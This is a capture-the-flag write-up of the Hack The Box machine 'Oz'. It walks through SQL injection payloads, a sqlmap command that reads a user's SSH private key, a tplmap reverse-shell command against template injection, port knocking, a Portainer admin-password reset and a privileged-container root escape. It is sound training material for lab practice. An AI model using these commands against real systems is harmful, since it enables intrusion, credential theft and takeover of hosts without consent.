### Quick Summary 
#### Hey I'm back with another Hack The Box write-up , this time Oz has retired and it was rated as a hard box. I enjoyed this box , it was really fun. It had some docker tricks which were very cool , It's a linux box and it's ip is 10.10.10.96 so let's jump right in.
#### Check out my [other Hack The Box write-ups](/categories)

### Nmap
#### As always we will start by running nmap to scan for open ports and services.
`nmap -sV -sT -o nmapinitial oz.htb`
#### Note : I added the ip to my /etc/hosts file as oz.htb
![](/images/hackthebox/oz/1.png)
#### And we see only http on port 80 and 8080. We also see that it's running a python server.
<br>
<hr>
### Enumerating http
#### On port 80 there's a web page with the title "OZ Webapi" and it's asking us to register a username.
![](/images/hackthebox/oz/2.png)
#### On port 8080 we see a login page.
![](/images/hackthebox/oz/3.png)
#### If we tried running gobuster on port 80 to find hidden dirs and files we will get a wildcard response.
![](/images/hackthebox/oz/4.png)
#### And that's because the server doesn't respond with 404. Instead of 404 , when we request a non-existing page the server responds with a line of random chars.
#### Here I requested `http://oz.htb/anything`
![](/images/hackthebox/oz/5.png)
#### And this makes it hard to enumerate because we will always get a 200 response. So what are we going to do is to use wfuzz to filter the responses for us.
`wfuzz -u http://oz.htb/FUZZ/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hl 0`
#### This won't show us any response with 0 lines.
![](/images/hackthebox/oz/6.png)
#### After a few seconds we get /users/
<br>
<hr>
### SQL Injection
#### When we visit /users/ in the browser we get the default response : please register a username.
![](/images/hackthebox/oz/7.png)
#### So we have /users/ which is a valid path , what happens if we tried a username that probably exists, something like admin ?
![](/images/hackthebox/oz/8.png)
#### We get a json response `username : "admin"` 
#### Let's try a single quote `'`
![](/images/hackthebox/oz/9.png)
#### We get 500 Internal Server Error, So this endpoint is probably vulnerable to SQL injection , Let's try something else , `'OR 1 OR'`
![](/images/hackthebox/oz/10.png)
#### We get another username : "dorthi" , So this is a confirmation that it's vulnerable to sqli , Let's do another injection and see if we can enumerate users 
`' or length(username)='4`
![](/images/hackthebox/oz/11.png)
#### Another username : "toto"
#### Let's try 7 
![](/images/hackthebox/oz/12.png)
#### tin.man 
#### So we confirmed it's sqli , The next step is to use sqlmap.
`sqlmap -u http://10.10.10.96/users/toto --all`
#### This will dump the whole database
![](/images/hackthebox/oz/13.png)
#### After some time it will start dumping tables and we will notice an interesting table `users_gbw`
![](/images/hackthebox/oz/14.png)
#### So if we try to crack those hashes the only one that will crack is wizard.oz : `wizardofoz22`
#### Now we have a username and its password let's login to port 8080
![](/images/hackthebox/oz/15.png)
<br>
<br>
<br>
![](/images/hackthebox/oz/16.png)
#### And success !
<br>
<hr>
### Dorthi's ssh key
#### We login to something that looks like a ticketing system, After reading the tickets we will find 2 interesting tickets.
![](/images/hackthebox/oz/17.png)
<br>
<br>
<br>
![](/images/hackthebox/oz/18.png)
<br>
<br>
<br>
![](/images/hackthebox/oz/19.png)
#### So this ssh key is on the database and we have sqli on that database , Let's grab it.
`sqlmap -u "http://10.10.10.96/users/toto" --string "username" --file-read "/home/dorthi/.ssh/id_rsa" -v1`
![](/images/hackthebox/oz/20.png)
<br>
<br>
<br>
![](/images/hackthebox/oz/21.png)
<br>
<br>
<br>
![](/images/hackthebox/oz/22.png)
#### Cool so now we can ssh and own user, No wait ...
#### By looking at the nmap scan again:
![](/images/hackthebox/oz/1.png)
#### There's no ssh listening !
<br>
<hr>
### Server Side Template Injection
#### If we return to that ticketing system we will see that we can add a ticket , it asks us for a name and a description.
![](/images/hackthebox/oz/23.png)
#### By capturing that request in burp we will see a POST request with two parameters name and desc.
![](/images/hackthebox/oz/24.png)
#### And the response outputs them.
![](/images/hackthebox/oz/25.png)
#### If we used [tplmap](https://github.com/epinna/tplmap) (a tool like sqlmap for automatic template injection exploitation) we will find that it's vulnerable.
`python tplmap.py -u 'http://10.10.10.96:8080' -X POST -d 'name=*&desc=anything' -c 'token=TOKEN' --reverse-shell 10.10.xx.xx 1337`
![](/images/hackthebox/oz/26.png)
<br>
<br>
<br>
![](/images/hackthebox/oz/27.png)
#### Then we check our listener , we will get a reverse shell.
<br>
<hr>
### Knock , Knock
#### After some enumeration we will find in `/` two unusual dirs `containers` and `.secret` , in `.secret` there is a file called `knockd.conf` 
![](/images/hackthebox/oz/28.png)
#### That's a configuration file for ssh port knocking, Port knocking means that in order to connect to an ssh server you need to ping some ports in a specific sequence to be able to connect.
![](/images/hackthebox/oz/29.png)
#### In our situation the ports are 40809 50212 46969 and all of them are udp
#### In the other dir `containers` there's a dir called `database` which has some files, One of them is called `start.sh`
![](/images/hackthebox/oz/30.png)
#### And we grabbed some passwords maybe we will need them later.
#### Now we know the port sequence let's ssh into the box. We can use knockd to do that but I used a small script that uses nmap.
![](/images/hackthebox/oz/31.png)
#### We `chmod 600` to the key then execute our script.
![](/images/hackthebox/oz/32.png)
#### The key is protected with a password , Let's try the db password we found earlier : "N0Pl4c3L1keH0me"
![](/images/hackthebox/oz/33.png)
#### And we owned user ! 
<br>
<hr>
### Portainer
#### After some regular enumeration if we do sudo -l we will find that dorthi can run some commands as root `docker network ls` and `docker network inspect *`
![](/images/hackthebox/oz/34.png)
#### Let's first list the networks 
`sudo docker network ls`
![](/images/hackthebox/oz/35.png)
#### We see some networks let's inspect the first one `bridge`
`sudo docker network inspect bridge`
![](/images/hackthebox/oz/36.png)
#### We find `portainer-1.11.1` and its ip is `172.17.0.2` , Portainer is the user interface for docker management and it usually runs http on port 9000 , we can also check that by using nmap. Luckily it's installed on the box.
![](/images/hackthebox/oz/37.png)
#### And we see that port 9000 is listening , so now we need to set up an ssh port forwarding to be able to access that portainer.
#### We can edit the ssh port knocking script to add the forwarding command.
![](/images/hackthebox/oz/38.png)
#### Now when we visit localhost on port 9000 we get a login page.
![](/images/hackthebox/oz/39.png)
#### By using the HTTP API as documented [here](https://gist.github.com/deviantony/77026d402366b4b43fa5918d41bc42f8) we can re-assign the admin password by sending a POST request to `/api/users/admin/init` with data as : `{"username":"admin","password":"new-password"}`
#### I did it with burp and set the password to `l0c4l` :

### Root
#### After we login we will see the dashboard showing the status of the containers.
![](/images/hackthebox/oz/42.png)
#### In the containers tab there are 4 container running.
![](/images/hackthebox/oz/43.png)
#### If we check the container webapi we can use its console.
![](/images/hackthebox/oz/44.png)
#### We can create a new container with the image of webapi and mount `/root` or the whole filesystem `/` then use the console to access it.
#### First we will grab the image name from the images tab : "webapi:latest"
![](/images/hackthebox/oz/45.png)
#### Then we will create a container and name it anything , I named it "NiceContainer" , add the image , then add a volume with path `/root` and mount it to /mnt/ 
![](/images/hackthebox/oz/46.png)
#### Then from the security tab we choose privileged mode.
![](/images/hackthebox/oz/47.png)
#### Click create , Use the console , `cd /mnt` and we own root ! :D
